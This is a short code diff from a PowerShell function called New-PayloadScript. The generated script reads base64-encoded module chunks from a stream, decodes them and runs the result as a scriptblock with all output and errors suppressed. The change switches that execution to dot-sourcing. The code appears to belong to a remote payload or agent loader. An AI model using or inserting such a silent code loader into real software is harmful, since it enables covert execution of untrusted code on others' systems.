@@ -201,7 +201,7 @@ function New-PayloadScript {
         "while(`$$modVarLine -ne `"__MODULE_END__:`$$modVarName`"){" +
         "if(`$$modVarLine -match '^__MODULE_CHUNK__:(.+)`$'){`$$modVarBuf.Append([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$Matches[1])))|Out-Null};" +
         "`$$modVarLine=`$$vRd.ReadLine()};" +
-        "try{& ([scriptblock]::Create(`$$modVarBuf.ToString())) 2>&1|Out-Null}catch{};" +
+        "try{. ([scriptblock]::Create(`$$modVarBuf.ToString())) 2>&1|Out-Null}catch{};" +
         "`$$vWr.WriteLine('$marker');`$$vWr.Flush();continue}"
     )
 
